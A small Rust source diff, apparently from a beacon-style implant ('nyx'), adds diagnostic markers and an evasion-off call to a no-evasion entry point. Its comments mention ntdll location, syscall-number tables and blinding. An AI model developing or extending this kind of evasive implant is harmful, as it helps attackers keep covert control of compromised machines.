@@ -299,8 +299,13 @@ pub unsafe extern "system" fn nyx_beacon_noevasion() {
 /// blind/pdata) causes issues on the specific host.
 #[no_mangle]
 pub unsafe extern "system" fn nyx_entry_noevasion() {
+    diag_mark(b"N0_entry");
     init_minimal();
+    diag_mark(b"N1_init_done");
+    crate::beacon::set_evasion_off();
+    diag_mark(b"N2_evasion_off");
     crate::beacon::beacon_loop();
+    diag_mark(b"N3_loop_returned"); // should never reach here
 }
 
 /// Minimal initialization: ntdll locate + SSN table + syscalls + CSPRNG.
